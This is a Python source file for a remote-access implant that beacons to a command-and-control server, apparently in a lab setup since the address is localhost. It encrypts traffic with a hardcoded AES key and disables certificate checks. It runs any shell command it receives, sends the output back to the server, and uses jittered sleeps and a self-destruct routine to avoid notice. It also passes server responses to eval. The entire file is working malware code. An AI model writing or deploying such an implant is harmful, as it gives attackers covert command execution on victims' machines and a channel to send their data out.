import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import subprocess
import time
import json
import random
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

C2_URL = "https://127.0.0.1:8443/"
BEACON_URL = C2_URL + "/api/updates"
RESULT_URL = C2_URL + "/api/upload"

SECRET_KEY = b"deadbeefbananana"
IV = b"randominitvector"

normal_sleep_range = (10, 30)
long_sleep_range = (600, 1200)
long_sleep = False
attempts = 0


def encrypt_data(data: str) -> str:
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    b64 = base64.b64encode(ct_bytes).decode()
    return "data=" + b64


def decrypt_data(data: str) -> str:
    b64 = data.replace("data=", "")
    ct = base64.b64decode(b64)
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()


while True:
    if attempts >= 3:
        long_sleep = True

    try:
        beacon_payload = encrypt_data("hi")
        r = requests.post(BEACON_URL, data=beacon_payload, verify=False, timeout=5)
        # contingency: enter long sleep mode if can't reach C2 until we can
        if not r.ok:
            attempts += 1
        else:
            long_sleep = False
            attempts = 0

        tasks = eval(decrypt_data(r.text)).get("tasks", [])
        for task in tasks:
            if task == "destroy":
                import os, sys

                try:
                    # delete itself and exit
                    script_path = os.path.realpath(__file__)
                    print("removing:", script_path)
                    # os.remove(script_path)
                    time.sleep(1)
                    sys.exit(0)
                except Exception as e:
                    print(f"Error self-destructing: {e}")
                    sys.exit(1)
            else:
                try:
                    output = subprocess.check_output(
                        task, shell=True, stderr=subprocess.STDOUT, text=True
                    )
                except subprocess.CalledProcessError as e:
                    output = e.output

                result_payload = encrypt_data(str({"result": output}))
                requests.post(RESULT_URL, data=result_payload, verify=False, timeout=5)

        if long_sleep:
            time.sleep(random.randrange(*long_sleep_range))
        else:
            time.sleep(random.randrange(*normal_sleep_range))

    except Exception as e:
        print(f"[!] Error: {e}")
        if long_sleep:
            time.sleep(random.randrange(*long_sleep_range))
        else:
            time.sleep(random.randrange(*normal_sleep_range))
